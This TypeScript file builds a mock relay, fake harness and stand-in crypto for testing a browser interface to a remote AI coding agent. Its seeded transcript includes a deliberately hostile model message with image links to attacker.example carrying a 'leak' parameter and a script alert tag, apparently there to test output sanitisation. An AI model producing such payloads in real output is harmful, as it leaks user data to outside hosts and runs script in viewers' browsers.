/**
 * An in-memory relay plus a fake harness, following protocol.md's browser leg.
 * Used by the tests and by `VITE_REMOTE_MOCK=1 npm run dev` until the real relay
 * (amp-api) and harness link exist. Envelopes carry MOCK_SIG instead of an
 * ES256 signature; `mockCrypto` is the matching stand-in for the real WebCrypto
 * signer (webCrypto.ts). Tests of real signatures use src/test/signedHarness.ts.
 *
 * Never imported by production code paths (RemoteProvider loads it only in dev).
 */
import type { RemoteCrypto } from '../crypto'
import { pairingLinkFor } from '../pairingLink'
import type { RemoteDeps } from '../remote-context'
import { RelayError, type EventStreamHandlers, type RelayTransport } from '../transport'
import type {
  ChatEvent, CommandEnvelope, HarnessPin, HelloBody, PromptBody, QueueItem, RelayFrame, SessionDetail, SessionStatus,
} from '../types'

export const MOCK_SIG = 'mock-signature'
export const MOCK_SESSION_ID = 'rs_MockSessionAAAAAAAAAAA'
// Public keys of the shared test vectors (keys.json harness-1 and device-a; test-only, never real),
// so a pairing link for the mock passes the page's fp(harness_pub) == h check.
export const MOCK_HARNESS_ID = 'KcrmtQDCZstbc69koLwXJWQvwvQbZAufZBMxCffV6DY'
export const MOCK_HARNESS_PUB = 'BFmykUTI3U73uc1ZQmpJ37t0-N5FYstMT3sSLzS42CUH_YHHlRDmGhqKfmLjtRlEqVqBnVfl7ixE0sDuL6h5uo8'
export const MOCK_DEVICE_ID = 'X5Pp2GXb6NEr3Jh05qAy4qnPP9oOBKhSltxS5yIPExs'
export const MOCK_DEVICE_NAME = 'Chrome on macOS'
export const MOCK_DEVICE_PUB = 'BOXV9BkDJ0hi2xzrV6sXLcp_zjyplXQ3P-w2JNb4vdok_OFQPMoA6uNSJ774mnyYxIee90qeY7dDFJWJdgFm_L4'

/**
 * Stand-in for the WebCrypto signer and verifier. `paired: false` behaves like an
 * unpaired browser until a pairing pins the harness.
 */
export function mockCrypto(opts: { paired?: boolean } = {}): RemoteCrypto {
  let paired = opts.paired ?? true
  return {
    harnessPin: async harnessId => paired && harnessId === MOCK_HARNESS_ID
      ? { harness_id: MOCK_HARNESS_ID, harness_pub: MOCK_HARNESS_PUB, host: 'jacobs-mbp', pinned_until_ms: Date.now() + 30 * 86_400_000 }
      : null,
    deviceId: async () => paired ? MOCK_DEVICE_ID : null,
    signCommand: async cmd => ({ ...cmd, sig: MOCK_SIG }),
    verifyEvent: async (env, pin: HarnessPin) => env.sig === MOCK_SIG && pin.harness_id === env.harness_id,
    ensureDevice: async () => ({ device_id: MOCK_DEVICE_ID, device_pub: MOCK_DEVICE_PUB }),
    signPairRequest: async () => MOCK_SIG,
    pinHarness: async pin => { paired = true; return pin },
  }
}

type Frame = { event: 'envelope' | 'snapshot' | 'relay'; data: string }
type Listener = (f: Frame) => void

export interface MockRelayOptions {
  /** Delay between the fake harness's streamed events (ms). 0 in tests. */
  stepMs?: number
  /** Seed the buffer with a transcript that uses every ChatEvent type. */
  seed?: boolean
  online?: boolean
}

const baseStatus = (): SessionStatus => ({
  model: 'anthropic/claude-opus-5-5', busy: false, context_pct: 37, cost_usd_micros: 1_834_200,
  project: { id: 2, name: 'AMP' }, ticket_id: 2372, branch: 'remote-m1-2372', queue_len: 0, workers_running: 1,
  devices: [{ device_id: MOCK_DEVICE_ID, name: MOCK_DEVICE_NAME }],
})

/** A transcript touching every ChatEvent type (protocol 6.4), including hostile model output. */
export function seedChatEvents(): ChatEvent[] {
  return [
    { type: 'user_message', prompt_id: 'p_1', text: 'run the tests and tell me what fails', origin: 'local', device_id: null, device_name: null },
    { type: 'run_start', run_id: 'run_1', prompt_id: 'p_1' },
    { type: 'message_start', message_id: 'msg_1', model: 'claude-opus-5-5', provider: 'anthropic' },
    { type: 'thinking_delta', message_id: 'msg_1', delta: 'The user wants the test suite run. Start with amp-core.' },
    { type: 'text_delta', message_id: 'msg_1', delta: 'Running the **amp-core** tests first.' },
    { type: 'tool_start', message_id: 'msg_1', tool_call_id: 'call_1', name: 'bash', arguments_json: '{"command":"cargo test -p amp-core","timeout":90}', truncated: false },
    { type: 'tool_end', tool_call_id: 'call_1', name: 'bash', is_error: true, text: 'running 214 tests\n'.concat('test ok\n'.repeat(30), 'test feed::replay ... FAILED\n\nfailures: 1'), truncated: true, full_bytes: 182_331 },
    { type: 'message_end', message_id: 'msg_1', stop_reason: 'tool_use', error: null, model: 'claude-opus-5-5', provider: 'anthropic',
      usage: { input_tokens: 12034, output_tokens: 311, cache_read_tokens: 90000, cache_write_tokens: 0, cost_usd_micros: 41250 } },
    { type: 'retry', attempt: 1, max_retries: 3, delay_ms: 2000, error: 'provider overloaded (529)' },
    { type: 'message_start', message_id: 'msg_2', model: 'claude-opus-5-5', provider: 'anthropic' },
    { type: 'text_delta', message_id: 'msg_2', delta: 'One failure in `feed::replay`. See [the CI run](https://github.com/jacobsims214/amp/actions) for details.\n\n' +
      '<img src="https://attacker.example/x.png?leak=1"> ![chart](https://attacker.example/pixel.png) <script>alert(1)</script>' },
    { type: 'message_end', message_id: 'msg_2', stop_reason: 'end_turn', error: null, model: 'claude-opus-5-5', provider: 'anthropic',
      usage: { input_tokens: 13120, output_tokens: 96, cache_read_tokens: 101000, cache_write_tokens: 0, cost_usd_micros: 12010 } },
    { type: 'run_end', run_id: 'run_1', outcome: 'completed', error: null },
    { type: 'notice', level: 'warn', code: 'mcp_hub', text: 'MCP server "context7" reconnected.' },
    { type: 'worker_status', workers: [
      { task_id: 2370, name: 'RC-M1 harness link', role: 'backend', state: 'running', model: 'claude-opus-5-5', started_at_ms: Date.now() - 600_000 },
      { task_id: 2371, name: 'RC-M1 relay routes', role: 'backend', state: 'done', model: null, started_at_ms: null },
    ] },
    { type: 'queue', items: [] },
  ]
}

export class MockRelay {
  readonly sessionId = MOCK_SESSION_ID
  online: boolean
  ended: string | null = null
  private seq = 0
  private buffer: { seq: number; wire: string }[] = []
  private listeners = new Set<Listener>()
  private hello: string | null = null
  private status: string | null = null
  private statusBody: SessionStatus = baseStatus()
  private queue: (QueueItem & { text: string })[] = []
  private runTimers: ReturnType<typeof setTimeout>[] = []
  private running: string | null = null
  private promptN = 1
  private runN = 1
  private msgN = 2
  private stepMs: number
  /** Every command the relay received, for tests. */
  readonly received: CommandEnvelope[] = []

  constructor(opts: MockRelayOptions = {}) {
    this.stepMs = opts.stepMs ?? 250
    this.online = opts.online ?? true
    const hello: HelloBody = {
      harness: { harness_id: MOCK_HARNESS_ID, harness_pub: MOCK_HARNESS_PUB, host: 'jacobs-mbp', os: 'macos', version: '0.4.0' },
      user_id: 1001, ops: ['prompt', 'stop', 'detach'],
      started_at_ms: Date.now() - 3_600_000, expires_at_ms: Date.now() + 11 * 3_600_000, idle_timeout_s: 1800,
      status: this.statusBody,
    }
    this.emit('hello', hello)
    if (opts.seed) for (const ev of seedChatEvents()) this.chat(ev)
  }

  summary(): SessionDetail {
    return {
      session_id: this.sessionId, harness_id: MOCK_HARNESS_ID, harness_fp_display: '29CA-E6B5-00C2-66CB', harness_pub: MOCK_HARNESS_PUB,
      host: 'jacobs-mbp', os: 'macos', harness_version: '0.4.0', project: { id: 2, name: 'AMP' }, online: this.online, viewers: this.listeners.size,
      started_at_ms: Date.now() - 3_600_000, expires_at_ms: Date.now() + 11 * 3_600_000, last_activity_at_ms: Date.now(), protocol_version: 1,
    }
  }

  /** Builds and publishes a harness event (the wire text a real harness would sign). */
  emit(op: string, body: unknown, device_id: string | null = null): string {
    const env = { v: 1, alg: 'ES256', session_id: this.sessionId, harness_id: MOCK_HARNESS_ID, device_id,
      seq: ++this.seq, ts: Date.now(), nonce: `n${this.seq}`, op, body, sig: MOCK_SIG }
    const wire = JSON.stringify(env)
    if (op === 'hello') this.hello = wire
    if (op === 'status') this.status = wire
    this.buffer.push({ seq: env.seq, wire })
    this.fan({ event: 'envelope', data: wire })
    return wire
  }

  chat(ev: ChatEvent) { return this.emit('chat_event', ev) }

  /** Sends a raw frame to every viewer (for tests: forged or hostile data). */
  inject(f: Frame) { this.fan(f) }

  setOnline(online: boolean) {
    this.online = online
    if (!online) this.clearRun()
    this.relay({ type: online ? 'online' : 'offline' })
  }

  end(reason: string) {
    this.ended = reason
    this.clearRun()
    this.relay({ type: 'ended', reason })
    this.listeners.clear()
  }

  relay(frame: RelayFrame) { this.fan({ event: 'relay', data: JSON.stringify(frame) }) }

  subscribe(fromSeq: number | null, fn: Listener): () => void {
    fn({ event: 'relay', data: JSON.stringify({ type: 'attached', online: this.online,
      oldest_seq: this.buffer[0]?.seq ?? null, latest_seq: this.buffer.at(-1)?.seq ?? null }) })
    if (this.hello) fn({ event: 'snapshot', data: this.hello })
    if (this.status) fn({ event: 'snapshot', data: this.status })
    for (const b of this.buffer) if (fromSeq == null || b.seq >= fromSeq) fn({ event: 'envelope', data: b.wire })
    this.listeners.add(fn)
    return () => { this.listeners.delete(fn) }
  }

  /** POST /api/sessions/:id/commands. */
  receive(env: CommandEnvelope) {
    if (this.ended) throw new RelayError(410, 'session_ended', 'The session has ended.')
    if (!this.online) throw new RelayError(409, 'harness_offline', 'The laptop is offline.')
    if (env.sig !== MOCK_SIG || env.device_id !== MOCK_DEVICE_ID) throw new RelayError(403, 'bad_signature', 'Bad signature.')
    this.received.push(env)
    const ref = { device_id: env.device_id, seq: env.seq }
    const ack = (result: 'started' | 'queued' | 'done', prompt_id: string | null, queue_position: number | null) =>
      this.emit('ack', { ref, op: env.op, result, prompt_id, queue_position }, env.device_id)
    // Answer asynchronously, as the real harness does over the relay.
    setTimeout(() => {
      if (env.op === 'prompt') {
        const { text } = env.body as PromptBody
        const prompt_id = `p_${++this.promptN}`
        if (this.running) {
          if (this.queue.length >= 5) {
            this.emit('refused', { ref, op: 'prompt', code: 'queue_full', message: 'The follow-up queue is full.', last_seq: null }, env.device_id)
            return
          }
          this.queue.push({ prompt_id, origin: 'remote', device_id: env.device_id, preview: text.slice(0, 80), text })
          ack('queued', prompt_id, this.queue.length)
          this.publishQueue()
        } else {
          ack('started', prompt_id, null)
          this.startRun(prompt_id, text, env.device_id)
        }
      } else if (env.op === 'stop') {
        ack('done', null, null)
        const wasRunning = this.running
        this.clearRun()
        this.queue = []
        this.publishQueue()
        this.chat({ type: 'notice', level: 'info', code: 'stopped', text: 'Stopped.' })
        if (wasRunning) this.chat({ type: 'run_end', run_id: wasRunning, outcome: 'aborted', error: null })
        this.setBusy(false)
      } else if (env.op === 'detach') {
        ack('done', null, null)
        this.emit('bye', { reason: 'detached' })
      }
    }, 0)
  }

  private publishQueue() {
    this.chat({ type: 'queue', items: this.queue.map(({ text: _t, ...q }) => { void _t; return q }) })
  }

  private setBusy(busy: boolean) {
    this.statusBody = { ...this.statusBody, busy, queue_len: this.queue.length }
    this.emit('status', this.statusBody)
  }

  private clearRun() {
    for (const t of this.runTimers) clearTimeout(t)
    this.runTimers = []
    this.running = null
  }

  private startRun(prompt_id: string, text: string, device_id: string | null) {
    const run_id = `run_${++this.runN}`
    const message_id = `msg_${++this.msgN}`
    this.running = run_id
    this.chat({ type: 'user_message', prompt_id, text, origin: 'remote', device_id, device_name: MOCK_DEVICE_NAME })
    this.chat({ type: 'run_start', run_id, prompt_id })
    this.setBusy(true)
    const steps: ChatEvent[] = [
      { type: 'message_start', message_id, model: 'claude-opus-5-5', provider: 'anthropic' },
      { type: 'thinking_delta', message_id, delta: 'Reading the request. ' },
      { type: 'text_delta', message_id, delta: 'On it. ' },
      { type: 'tool_start', message_id, tool_call_id: `call_${message_id}`, name: 'read', arguments_json: '{"path":"v2/ui/src/App.tsx"}', truncated: false },
      { type: 'tool_end', tool_call_id: `call_${message_id}`, name: 'read', is_error: false, text: 'import { BrowserRouter } from \'react-router-dom\'\n…', truncated: false, full_bytes: 2812 },
      { type: 'text_delta', message_id, delta: `You said: "${text.slice(0, 60)}". Done.` },
      { type: 'message_end', message_id, stop_reason: 'end_turn', error: null, model: 'claude-opus-5-5', provider: 'anthropic',
        usage: { input_tokens: 900, output_tokens: 40, cache_read_tokens: 0, cache_write_tokens: 0, cost_usd_micros: 3100 } },
      { type: 'run_end', run_id, outcome: 'completed', error: null },
    ]
    steps.forEach((ev, i) => {
      this.runTimers.push(setTimeout(() => {
        this.chat(ev)
        if (ev.type === 'run_end') {
          this.running = null
          this.setBusy(false)
          const next = this.queue.shift()
          if (next) { this.publishQueue(); this.startRun(next.prompt_id, next.text, next.device_id) }
        }
      }, this.stepMs * (i + 1)))
    })
  }

  private fan(f: Frame) { for (const l of this.listeners) l(f) }
}

/** A RelayTransport over a MockRelay (no HTTP at all). */
export function mockTransport(relay: MockRelay): RelayTransport {
  const check = (id: string) => { if (id !== relay.sessionId) throw new RelayError(404, 'not_found', 'No such session.') }
  return {
    listSessions: async () => relay.ended ? [] : [relay.summary()],
    getSession: async id => {
      check(id)
      if (relay.ended) throw new RelayError(410, 'session_ended', 'The session has ended.')
      return relay.summary()
    },
    openEvents(id, fromSeq, h: EventStreamHandlers) {
      let closed = false
      let unsub = () => {}
      queueMicrotask(() => {
        if (closed) return
        if (id !== relay.sessionId) { h.onClose(new RelayError(404, 'not_found', 'No such session.')); return }
        h.onOpen()
        unsub = relay.subscribe(fromSeq, f => {
          if (closed) return
          h.onActivity()
          if (f.event === 'envelope') h.onEnvelope(f.data)
          else if (f.event === 'snapshot') h.onSnapshot(f.data)
          else h.onRelay(JSON.parse(f.data) as RelayFrame)
        })
      })
      return () => { closed = true; unsub() }
    },
    postCommand: async (id, env) => { check(id); relay.receive(env) },
    disconnect: async id => { check(id); relay.end('disconnected') },
    pair: async (id, msg) => {
      check(id)
      // The mock laptop says yes after a few seconds, long enough to see the code.
      setTimeout(() => relay.emit('pair_result', { pairing_id: msg.request.pairing_id, result: 'accepted', code: null, tries_left: null,
        pinned_until_ms: Date.now() + 30 * 86_400_000 }, msg.request.device_id), 4_000)
      return { expires_at_ms: Date.now() + 300_000 }
    },
  }
}

/**
 * Dev wiring for `VITE_REMOTE_MOCK=1`: a seeded session at /sessions/rs_MockSessionAAAAAAAAAAA.
 * Opened with a pairing link (`#p=<any 32 bytes b64u>&h=<MOCK_HARNESS_ID>`) it starts unpaired
 * and shows the pairing screen; the mock laptop accepts after 4 s.
 */
export function devMockDeps(): RemoteDeps {
  const relay = new MockRelay({ seed: true })
  return { transport: mockTransport(relay), crypto: mockCrypto({ paired: !pairingLinkFor(MOCK_SESSION_ID) }), mock: true }
}
